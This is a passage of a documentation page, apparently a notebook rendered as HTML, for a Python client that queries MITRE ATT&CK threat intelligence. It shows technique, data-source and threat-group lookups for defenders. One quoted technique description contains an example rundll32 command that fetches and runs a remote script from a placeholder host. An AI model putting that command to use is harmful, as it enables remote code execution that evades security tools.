@@ -1,0 +1,778 @@
+
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Filtering and Looking Up STIX Objects in ATT&amp;CK &#8212; ATTACK Python Client</title>
+    
+  <link href="../_static/css/theme.css" rel="stylesheet">
+  <link href="../_static/css/index.ff1ffe594081f20da1ef19478df9384b.css" rel="stylesheet">
+
+    
+  <link rel="stylesheet"
+    href="../_static/vendor/fontawesome/5.13.0/css/all.min.css">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../_static/vendor/fontawesome/5.13.0/webfonts/fa-solid-900.woff2">
+  <link rel="preload" as="font" type="font/woff2" crossorigin
+    href="../_static/vendor/fontawesome/5.13.0/webfonts/fa-brands-400.woff2">
+
+    
+      
+
+    
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/sphinx-book-theme.css?digest=c3fdc42140077d1ad13ad2f1588a4309" type="text/css" />
+    <link rel="stylesheet" type="text/css" href="../_static/togglebutton.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/copybutton.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/mystnb.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/sphinx-thebe.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/panels-main.c949a650a448cc0ae9fd3441c0e17fb0.css" />
+    <link rel="stylesheet" type="text/css" href="../_static/panels-variables.06eb56fa6e07937060861dad626602ad.css" />
+    
+  <link rel="preload" as="script" href="../_static/js/index.be7d3bbb2ef33a8344ce.js">
+
+    <script id="documentation_options" data-url_root="../" src="../_static/documentation_options.js"></script>
+    <script src="../_static/jquery.js"></script>
+    <script src="../_static/underscore.js"></script>
+    <script src="../_static/doctools.js"></script>
+    <script src="../_static/togglebutton.js"></script>
+    <script src="../_static/clipboard.min.js"></script>
+    <script src="../_static/copybutton.js"></script>
+    <script >var togglebuttonSelector = '.toggle, .admonition.dropdown, .tag_hide_input div.cell_input, .tag_hide-input div.cell_input, .tag_hide_output div.cell_output, .tag_hide-output div.cell_output, .tag_hide_cell.cell, .tag_hide-cell.cell';</script>
+    <script src="../_static/sphinx-book-theme.d59cb220de22ca1c485ebbdc042f0030.js"></script>
+    <script async="async" src="https://unpkg.com/thebe@0.5.1/lib/index.js"></script>
+    <script >
+        const thebe_selector = ".thebe"
+        const thebe_selector_input = "pre"
+        const thebe_selector_output = ".output"
+    </script>
+    <script async="async" src="../_static/sphinx-thebe.js"></script>
+    <link rel="canonical" href="https://attackcti.com/playground/8-Lookup_Functions.html" />
+    <link rel="index" title="Index" href="../genindex.html" />
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="prev" title="Exporting ATT&amp;CK Group Navigator Layers" href="7-Export_Groups_Navigator_Layers.html" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="docsearch:language" content="None">
+    
+
+    <!-- Google Analytics -->
+    
+  </head>
+  <body data-spy="scroll" data-target="#bd-toc-nav" data-offset="80">
+    
+    <div class="container-fluid" id="banner"></div>
+
+    
+
+    <div class="container-xl">
+      <div class="row">
+          
+<div class="col-12 col-md-3 bd-sidebar site-navigation show" id="site-navigation">
+    
+        <div class="navbar-brand-box">
+    <a class="navbar-brand text-wrap" href="../index.html">
+      
+        <!-- `logo` is deprecated in Sphinx 4.0, so remove this when we stop supporting 3 -->
+        
+      
+      
+      <img src="../_static/logo.png" class="logo" alt="logo">
+      
+      
+      <h1 class="site-logo" id="site-title">ATTACK Python Client</h1>
+      
+    </a>
+</div><form class="bd-search d-flex align-items-center" action="../search.html" method="get">
+  <i class="icon fas fa-search"></i>
+  <input type="search" class="form-control" name="q" id="search-input" placeholder="Search this book..." aria-label="Search this book..." autocomplete="off" >
+</form><nav class="bd-links" id="bd-docs-nav" aria-label="Main">
+    <div class="bd-toc-item active">
+        <p class="caption">
+ <span class="caption-text">
+  Playground
+ </span>
+</p>
+<ul class="current nav bd-sidenav">
+ <li class="toctree-l1">
+  <a class="reference internal" href="1-Collect_All_Functions.html">
+   Collect All Functions
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="2-Collect_Matrix_Specific_Functions.html">
+   Collect Matrix Specific Functions
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="3-Export_All_Techniques_To_CSV.html">
+   Export All Techniques to CSV
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="4-Explore_Data_Sources.html">
+   Explore ATT&amp;CK Data Sources
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="5-Collect_Techniques_by_Data_Sources.html">
+   Get Techniques from Data Sources
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="6-Explore_ICS_Attack.html">
+   Exploring ICS ATT&amp;CK
+  </a>
+ </li>
+ <li class="toctree-l1">
+  <a class="reference internal" href="7-Export_Groups_Navigator_Layers.html">
+   Exporting ATT&amp;CK Group Navigator Layers
+  </a>
+ </li>
+ <li class="toctree-l1 current active">
+  <a class="current reference internal" href="#">
+   Filtering and Looking Up STIX Objects in ATT&amp;CK
+  </a>
+ </li>
+</ul>
+
+    </div>
+</nav> <!-- To handle the deprecated key -->
+
+<div class="navbar_extra_footer">
+  Powered by <a href="https://jupyterbook.org">Jupyter Book</a>
+</div>
+
+</div>
+
+
+          
+
+
+          
+<main class="col py-md-3 pl-md-4 bd-content overflow-auto" role="main">
+    
+    <div class="topbar container-xl fixed-top">
+    <div class="topbar-contents row">
+        <div class="col-12 col-md-3 bd-topbar-whitespace site-navigation show"></div>
+        <div class="col pl-md-4 topbar-main">
+            
+            <button id="navbar-toggler" class="navbar-toggler ml-0" type="button" data-toggle="collapse"
+                data-toggle="tooltip" data-placement="bottom" data-target=".site-navigation" aria-controls="navbar-menu"
+                aria-expanded="true" aria-label="Toggle navigation" aria-controls="site-navigation"
+                title="Toggle navigation" data-toggle="tooltip" data-placement="left">
+                <i class="fas fa-bars"></i>
+                <i class="fas fa-arrow-left"></i>
+                <i class="fas fa-arrow-up"></i>
+            </button>
+            
+            
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn" aria-label="Download this page"><i
+            class="fas fa-download"></i></button>
+
+    <div class="dropdown-buttons">
+        <!-- ipynb file if we had a myst markdown file -->
+        
+        <!-- Download raw file -->
+        <a class="dropdown-buttons" href="../_sources/playground/8-Lookup_Functions.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
+                data-placement="left">.ipynb</button></a>
+        <!-- Download PDF via print -->
+        <button type="button" id="download-print" class="btn btn-secondary topbarbtn" title="Print to PDF"
+                onclick="printPdf(this)" data-toggle="tooltip" data-placement="left">.pdf</button>
+    </div>
+</div>
+
+            <!-- Source interaction buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Connect with source repository"><i class="fab fa-github"></i></button>
+    <div class="dropdown-buttons sourcebuttons">
+        <a class="repository-button"
+            href="https://github.com/OTRF/ATTACK-Python-Client"><button type="button" class="btn btn-secondary topbarbtn"
+                data-toggle="tooltip" data-placement="left" title="Source repository"><i
+                    class="fab fa-github"></i>repository</button></a>
+        <a class="issues-button"
+            href="https://github.com/OTRF/ATTACK-Python-Client/issues/new?title=Issue%20on%20page%20%2Fplayground/8-Lookup_Functions.html&body=Your%20issue%20content%20here."><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
+        <a class="edit-button" href="https://github.com/OTRF/ATTACK-Python-Client/edit/master/docs/playground/8-Lookup_Functions.ipynb"><button
+                type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
+                title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
+    </div>
+</div>
+
+            <!-- Full screen (wrap in <a> to have style consistency -->
+
+<a class="full-screen-button"><button type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip"
+        data-placement="bottom" onclick="toggleFullScreen()" aria-label="Fullscreen mode"
+        title="Fullscreen mode"><i
+            class="fas fa-expand"></i></button></a>
+
+            <!-- Launch buttons -->
+
+<div class="dropdown-buttons-trigger">
+    <button id="dropdown-buttons-trigger" class="btn btn-secondary topbarbtn"
+        aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
+    <div class="dropdown-buttons">
+        
+        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/ATTACK-Python-Client/master?urlpath=tree/docs/playground/8-Lookup_Functions.ipynb"><button type="button"
+                class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
+                data-placement="left"><img class="binder-button-logo"
+                    src="../_static/images/logo_binder.svg"
+                    alt="Interact on binder">Binder</button></a>
+        
+        
+        
+        
+    </div>
+</div>
+
+        </div>
+
+        <!-- Table of contents -->
+        <div class="d-none d-md-block col-md-2 bd-toc show noprint">
+            
+            <div class="tocsection onthispage pt-5 pb-3">
+                <i class="fas fa-list"></i> Contents
+            </div>
+            <nav id="bd-toc-nav" aria-label="Page">
+                <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#import-attack-api-client">
+   Import ATTACK API Client
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#import-extra-libraries">
+   Import Extra Libraries
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#initialize-att-ck-client-variable">
+   Initialize ATT&amp;CK Client Variable
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-technique-by-name-taxii">
+   Get Technique by Name (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-data-sources-from-all-techniques-taxii">
+   Get Data Sources from All Techniques (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-any-stix-object-by-id-taxii">
+   Get Any STIX Object by ID (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-any-group-by-alias-taxii">
+   Get Any Group by Alias (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-relationships-by-any-object-taxii">
+   Get Relationships by Any Object (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-all-techniques-with-mitigations-taxii">
+   Get All Techniques with Mitigations (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-techniques-used-by-software-taxii">
+   Get Techniques Used by Software (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-techniques-used-by-group-taxii">
+   Get Techniques Used by Group (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-software-used-by-group-taxii">
+   Get Software Used by Group (TAXII)
+  </a>
+ </li>
+</ul>
+
+            </nav>
+        </div>
+    </div>
+</div>
+    <div id="main-content" class="row">
+        <div class="col-12 col-md-9 pl-md-3 pr-md-0">
+            <!-- Table of contents that is only displayed when printing the page -->
+            <div id="jb-print-docs-body" class="onlyprint">
+                <h1>Filtering and Looking Up STIX Objects in ATT&CK</h1>
+                <!-- Table of contents -->
+                <div id="print-main-content">
+                    <div id="jb-print-toc">
+                        
+                        <div>
+                            <h2> Contents </h2>
+                        </div>
+                        <nav aria-label="Page">
+                            <ul class="visible nav section-nav flex-column">
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#import-attack-api-client">
+   Import ATTACK API Client
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#import-extra-libraries">
+   Import Extra Libraries
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#initialize-att-ck-client-variable">
+   Initialize ATT&amp;CK Client Variable
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-technique-by-name-taxii">
+   Get Technique by Name (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-data-sources-from-all-techniques-taxii">
+   Get Data Sources from All Techniques (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-any-stix-object-by-id-taxii">
+   Get Any STIX Object by ID (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-any-group-by-alias-taxii">
+   Get Any Group by Alias (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-relationships-by-any-object-taxii">
+   Get Relationships by Any Object (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-all-techniques-with-mitigations-taxii">
+   Get All Techniques with Mitigations (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-techniques-used-by-software-taxii">
+   Get Techniques Used by Software (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-techniques-used-by-group-taxii">
+   Get Techniques Used by Group (TAXII)
+  </a>
+ </li>
+ <li class="toc-h2 nav-item toc-entry">
+  <a class="reference internal nav-link" href="#get-software-used-by-group-taxii">
+   Get Software Used by Group (TAXII)
+  </a>
+ </li>
+</ul>
+
+                        </nav>
+                    </div>
+                </div>
+            </div>
+            
+              <div>
+                
+  <div class="tex2jax_ignore mathjax_ignore section" id="filtering-and-looking-up-stix-objects-in-att-ck">
+<h1>Filtering and Looking Up STIX Objects in ATT&amp;CK<a class="headerlink" href="#filtering-and-looking-up-stix-objects-in-att-ck" title="Permalink to this headline">¶</a></h1>
+<hr class="docutils" />
+<div class="section" id="import-attack-api-client">
+<h2>Import ATTACK API Client<a class="headerlink" href="#import-attack-api-client" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">attackcti</span> <span class="kn">import</span> <span class="n">attack_client</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="import-extra-libraries">
+<h2>Import Extra Libraries<a class="headerlink" href="#import-extra-libraries" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="kn">from</span> <span class="nn">pandas</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="kn">import</span> <span class="nn">logging</span>
+<span class="n">logging</span><span class="o">.</span><span class="n">getLogger</span><span class="p">(</span><span class="s1">&#39;taxii2client&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">setLevel</span><span class="p">(</span><span class="n">logging</span><span class="o">.</span><span class="n">CRITICAL</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="initialize-att-ck-client-variable">
+<h2>Initialize ATT&amp;CK Client Variable<a class="headerlink" href="#initialize-att-ck-client-variable" title="Permalink to this headline">¶</a></h2>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">lift</span> <span class="o">=</span> <span class="n">attack_client</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-technique-by-name-taxii">
+<h2>Get Technique by Name (TAXII)<a class="headerlink" href="#get-technique-by-name-taxii" title="Permalink to this headline">¶</a></h2>
+<p>You can use a custom method in the attack_client class to get a technique across all the matrices by its name. It is case sensitive.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">technique_name</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_technique_by_name</span><span class="p">(</span><span class="s1">&#39;Rundll32&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">technique_name</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2020-01-23T18:03:46.248Z&#39;, modified=&#39;2021-10-14T21:45:53.057Z&#39;, name=&#39;Rundll32&#39;, description=&#39;Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: &lt;code&gt;rundll32.exe {DLLname, DLLfunction}&lt;/code&gt;).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions &lt;code&gt;Control_RunDLL&lt;/code&gt; and &lt;code&gt;Control_RunDLLAsUser&lt;/code&gt;. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: &lt;code&gt;rundll32.exe javascript:&quot;\\..\\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:https[:]//www[.]example[.]com/malicious.sct&quot;)&quot;&lt;/code&gt;  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command &lt;code&gt;rundll32.exe ExampleDLL.dll, ExampleFunction&lt;/code&gt;, rundll32.exe would first attempt to execute &lt;code&gt;ExampleFunctionW&lt;/code&gt;, or failing that &lt;code&gt;ExampleFunctionA&lt;/code&gt;, before loading &lt;code&gt;ExampleFunction&lt;/code&gt;). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending &lt;code&gt;W&lt;/code&gt; and/or &lt;code&gt;A&lt;/code&gt; to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)&#39;, kill_chain_phases=[KillChainPhase(kill_chain_name=&#39;mitre-attack&#39;, phase_name=&#39;defense-evasion&#39;)], revoked=False, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1218/011&#39;, external_id=&#39;T1218.011&#39;), ExternalReference(source_name=&#39;Trend Micro CPL&#39;, description=&#39;Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.&#39;, url=&#39;https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf&#39;), ExternalReference(source_name=&#39;This is Security Command Line Confusion&#39;, description=&#39;B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.&#39;, url=&#39;https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/&#39;), ExternalReference(source_name=&#39;Attackify Rundll32.exe Obscurity&#39;, description=&#39;Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.&#39;, url=&#39;https://www.attackify.com/blog/rundll32_execution_order/&#39;), ExternalReference(source_name=&#39;Github NoRunDll&#39;, description=&#39;gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.&#39;, url=&#39;https://github.com/gtworek/PSBits/tree/master/NoRunDll&#39;)], object_marking_refs=[&#39;marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168&#39;], x_mitre_contributors=[&#39;Gareth Phillips, Seek Ltd.&#39;, &#39;Casey Smith&#39;, &#39;Ricardo Dias&#39;], x_mitre_data_sources=[&#39;File: File Metadata&#39;, &#39;Process: Process Creation&#39;, &#39;Command: Command Execution&#39;, &#39;Module: Module Load&#39;], x_mitre_defense_bypassed=[&#39;Digital Certificate Validation&#39;, &#39;Application control&#39;, &#39;Anti-virus&#39;], x_mitre_detection=&#39;Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.&#39;, x_mitre_is_subtechnique=True, x_mitre_permissions_required=[&#39;User&#39;], x_mitre_platforms=[&#39;Windows&#39;], x_mitre_version=&#39;1.1&#39;),
+ AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--62b8c999-dcc0-4755-bd69-09442d9359f5&#39;, created=&#39;2017-05-31T21:31:06.045Z&#39;, modified=&#39;2020-01-31T19:01:41.919Z&#39;, name=&#39;Rundll32&#39;, revoked=True, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1085&#39;, external_id=&#39;T1085&#39;), ExternalReference(source_name=&#39;Trend Micro CPL&#39;, description=&#39;Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.&#39;, url=&#39;https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf&#39;), ExternalReference(source_name=&#39;This is Security Command Line Confusion&#39;, description=&#39;B. Ancel. (2014, August 20). Poweliks – Command Line Confusion. Retrieved March 5, 2018.&#39;, url=&#39;https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/&#39;)])]
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-data-sources-from-all-techniques-taxii">
+<h2>Get Data Sources from All Techniques (TAXII)<a class="headerlink" href="#get-data-sources-from-all-techniques-taxii" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>You can also get all the data sources available in ATT&amp;CK</p></li>
+<li><p>Currently the only techniques with data sources are the ones in Enterprise ATT&amp;CK.</p></li>
+</ul>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">data_sources</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_data_sources</span><span class="p">()</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="nb">len</span><span class="p">(</span><span class="n">data_sources</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>38
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="k">for</span> <span class="n">ds</span> <span class="ow">in</span> <span class="n">data_sources</span><span class="p">:</span>
+    <span class="nb">print</span><span class="p">(</span><span class="n">ds</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">])</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>Internet Scan
+Certificate
+Domain Name
+Volume
+Group
+Cluster
+Logon Session
+Network Share
+Container
+Active Directory
+Driver
+Instance
+Network Traffic
+File
+Firewall
+Persona
+Cloud Service
+Named Pipe
+Service
+Windows Registry
+Command
+Snapshot
+Module
+Sensor Health
+Application Log
+Script
+Cloud Storage
+Drive
+Kernel
+Pod
+Process
+Scheduled Job
+Web Credential
+Malware Repository
+User Account
+WMI
+Image
+Firmware
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-any-stix-object-by-id-taxii">
+<h2>Get Any STIX Object by ID (TAXII)<a class="headerlink" href="#get-any-stix-object-by-id-taxii" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><p>You can get any STIX object by its id across all the matrices. It is case sensitive.</p></li>
+<li><p>You can use the following STIX Object Types:</p>
+<ul>
+<li><p>attack-pattern &gt;  techniques</p></li>
+<li><p>course-of-action &gt; mitigations</p></li>
+<li><p>intrusion-set &gt; groups</p></li>
+<li><p>malware</p></li>
+<li><p>tool</p></li>
+</ul>
+</li>
+</ul>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">object_by_id</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_object_by_attack_id</span><span class="p">(</span><span class="s1">&#39;attack-pattern&#39;</span><span class="p">,</span> <span class="s1">&#39;T1103&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">object_by_id</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[AttackPattern(type=&#39;attack-pattern&#39;, id=&#39;attack-pattern--317fefa6-46c7-4062-adb6-2008cf6bcb41&#39;, created=&#39;2017-05-31T21:31:15.409Z&#39;, modified=&#39;2020-11-10T18:29:30.379Z&#39;, name=&#39;AppInit DLLs&#39;, revoked=True, external_references=[ExternalReference(source_name=&#39;mitre-attack&#39;, url=&#39;https://attack.mitre.org/techniques/T1103&#39;, external_id=&#39;T1103&#39;), ExternalReference(source_name=&#39;Elastic Process Injection July 2017&#39;, description=&#39;Hosseini, A. (2017, July 18). Ten Process Injection Techniques: A Technical Survey Of Common And Trending Process Injection Techniques. Retrieved December 7, 2017.&#39;, url=&#39;https://www.endgame.com/blog/technical-blog/ten-process-injection-techniques-technical-survey-common-and-trending-process&#39;), ExternalReference(source_name=&#39;AppInit Registry&#39;, description=&#39;Microsoft. (2006, October). Working with the AppInit_DLLs registry value. Retrieved July 15, 2015.&#39;, url=&#39;https://support.microsoft.com/en-us/kb/197571&#39;), ExternalReference(source_name=&#39;AppInit Secure Boot&#39;, description=&#39;Microsoft. (n.d.). AppInit DLLs and Secure Boot. Retrieved July 15, 2015.&#39;, url=&#39;https://msdn.microsoft.com/en-us/library/dn280412&#39;), ExternalReference(source_name=&#39;TechNet Autoruns&#39;, description=&#39;Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.&#39;, url=&#39;https://technet.microsoft.com/en-us/sysinternals/bb963902&#39;)])]
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+<div class="section" id="get-any-group-by-alias-taxii">
+<h2>Get Any Group by Alias (TAXII)<a class="headerlink" href="#get-any-group-by-alias-taxii" title="Permalink to this headline">¶</a></h2>
+<p>You can get any Group by its Alias property across all the matrices. It is case sensitive.</p>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">group_name</span> <span class="o">=</span> <span class="n">lift</span><span class="o">.</span><span class="n">get_group_by_alias</span><span class="p">(</span><span class="s1">&#39;Cozy Bear&#39;</span><span class="p">)</span>
+</pre></div>
+</div>
+</div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">group_name</span>
+</pre></div>
+</div>
+</div>
+<div class="cell_output docutils container">
+<div class="output text_plain highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[IntrusionSet(type=&#39;intrusion-set&#39;, id=&#39;intrusion-set--899ce53f-13a0-479b-a0e4-67d46e241542&#39;, created_by_ref=&#39;identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5&#39;, created=&#39;2017-05-31T21:31:52.748Z&#39;, modified=&#39;2021-10-16T00:59:58.792Z&#39;, name=&#39;APT29&#39;, description=&quot;[APT29](https://attack.mitre.org/groups/G0016) is threat group that has been attributed to Russia&#39;s Foreign Intelligence Service (SVR).(Citation: White House Imposing Costs RU Gov April 2021)(Citation: UK Gov Malign RIS Activity April 2021) They have operated since at least 2008, often targeting government networks in Europe and NATO member countries, research institutes, and think tanks. [APT29](https://attack.mitre.org/groups/G0016) reportedly compromised the Democratic National Committee starting in the summer of 2015.(Citation: F-Secure The Dukes)(Citation: GRIZZLY STEPPE JAR)(Citation: Crowdstrike DNC June 2016)(Citation: UK Gov UK Exposes Russia SolarWinds April 2021)\n\nIn April 2021, the US and UK governments attributed the SolarWinds supply chain compromise cyber operation to the SVR; public statements included citations to [APT29](https://attack.mitre.org/groups/G0016), Cozy Bear, and The Dukes.(Citation: NSA Joint Advisory SVR SolarWinds April 2021)(Citation: UK NSCS Russia SolarWinds April 2021) Victims of this campaign included government, consulting, technology, telecom, and other organizations in North America, 